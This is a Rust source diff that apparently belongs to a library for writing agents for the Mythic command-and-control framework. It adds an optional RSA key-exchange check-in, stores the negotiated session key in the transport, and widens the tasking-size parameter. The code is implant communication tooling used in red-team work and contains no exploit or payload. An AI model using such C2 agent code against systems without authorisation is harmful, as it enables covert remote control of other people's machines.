@@ -1,10 +1,11 @@
 //! High-level agent facade — build, send, and parse Mythic protocol messages.
 
-use alloc::string::String;
-use alloc::vec::Vec;
+use std::string::String;
+use std::vec::Vec;
 use uuid::Uuid;
 
-use crate::MythicResult;
+#[cfg(feature = "rsa-staging")]
+use crate::protocol::checkin::RespCheckin;
 use crate::protocol::checkin::{self, DirectResult};
 use crate::protocol::codec::{
     Aes256HmacCrypto, decode_message, decode_message_plain, encode_message, encode_message_plain,
@@ -14,6 +15,7 @@ use crate::protocol::{
     RespPostResponse,
 };
 use crate::transport::C2Transport;
+use crate::{MythicError, MythicResult};
 
 /// Post-checkin phase — holds the callback UUID assigned by Mythic.
 ///
@@ -34,12 +36,12 @@ use crate::transport::C2Transport;
 /// #     fn get_tasking(&self, p: &str) -> Result<String, MythicError> { Ok(String::new()) }
 /// #     fn post_response(&self, p: &str) -> Result<String, MythicError> { Ok(String::new()) }
 /// # }
-/// let c2 = HttpC2;
+/// let mut c2 = HttpC2;
 /// let payload_uuid = Uuid::parse_str("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee").unwrap();
 ///
 /// let agent = MythicAgent::easy_checkin(
 ///     payload_uuid,
-///     &c2,
+///     &mut c2,
 ///     vec!["10.0.0.1".into()],
 ///     Some("linux".into()),
 ///     Some("root".into()),
@@ -76,7 +78,7 @@ impl MythicAgent {
     #[allow(clippy::too_many_arguments)]
     pub fn easy_checkin<C: C2Transport>(
         payload_uuid: Uuid,
-        c2: &C,
+        c2: &mut C,
         ips: Vec<String>,
         os: Option<String>,
         user: Option<String>,
@@ -113,8 +115,18 @@ impl MythicAgent {
     /// The mode is determined automatically from the transport
     /// via [`C2Transport::get_aes_psk`].  `req.uuid` must be the payload
     /// UUID; it is used both in the JSON body and the wire framing.
-    pub fn checkin<C: C2Transport>(mut self, req: ReqCheckin, c2: &C) -> MythicResult<Self> {
+    ///
+    /// This method takes `&mut C` because RSA/translation staging may
+    /// negotiate a new session key that must be stored back into the transport.
+    pub fn checkin<C: C2Transport>(mut self, req: ReqCheckin, c2: &mut C) -> MythicResult<Self> {
         let payload_uuid = req.uuid;
+
+        if c2.encrypted_exchange_check() {
+            #[cfg(feature = "rsa-staging")]
+            return self.rsa_checkin(req, c2);
+            #[cfg(not(feature = "rsa-staging"))]
+            return Err(MythicError::KeyExchangeFailed);
+        }
 
         let needs_crypto = c2.get_aes_psk().is_some();
         let iv = if needs_crypto {
@@ -131,10 +143,53 @@ impl MythicAgent {
         Ok(self)
     }
 
+    /// Perform an RSA encrypted key exchange checkin.
+    ///
+    /// This is used when the transport reports
+    /// [`C2Transport::encrypted_exchange_check`] as `true`. It executes the
+    /// full `staging_rsa` → temp key → normal checkin flow.
+    #[cfg(feature = "rsa-staging")]
+    pub fn rsa_checkin<C: C2Transport>(
+        mut self,
+        req: ReqCheckin,
+        c2: &mut C,
+    ) -> MythicResult<Self> {
+        use crate::protocol::checkin::{RsaStagingResult, rsa_staging_checkin};
+        use crate::protocol::codec::encode_message;
+        use crate::protocol::crypto::random_iv;
+
+        let payload_uuid = req.uuid;
+        let RsaStagingResult {
+            temp_uuid, crypto, ..
+        } = rsa_staging_checkin(&*c2, payload_uuid)?;
+
+        // Persist the negotiated session key back into the transport so that
+        // subsequent get_tasking/post_response calls use it.
+        c2.set_aes_psk(&crypto.key_b64());
+
+        let iv = random_iv()?;
+        let packed = encode_message(&req, temp_uuid, &crypto, &iv)?;
+        let response = c2.checkin(&packed)?;
+        let (_, resp): (Uuid, RespCheckin) =
+            crate::protocol::codec::decode_message(&response, Some(temp_uuid), &crypto)?;
+
+        if resp.status != "success" {
+            return Err(MythicError::protocol(format!(
+                "checkin rejected after RSA staging: status={}",
+                resp.status
+            )));
+        }
+
+        self.callback_uuid = resp.id;
+        Ok(self)
+    }
+
     /// Poll for new tasks from the Mythic server (no extras).
+    ///
+    /// `tasking_size` of `-1` asks Mythic for all available tasks.
     pub fn get_tasking<C: C2Transport>(
         &self,
-        tasking_size: u32,
+        tasking_size: i32,
         c2: &C,
     ) -> MythicResult<RespGetTasking> {
         self.get_tasking_with(tasking_size, c2, AgentMessageExtras::default())
@@ -144,7 +199,7 @@ impl MythicAgent {
     /// edges, alerts, and/or responses alongside the request.
     pub fn get_tasking_with<C: C2Transport>(
         &self,
-        tasking_size: u32,
+        tasking_size: i32,
         c2: &C,
         extras: AgentMessageExtras,
     ) -> MythicResult<RespGetTasking> {
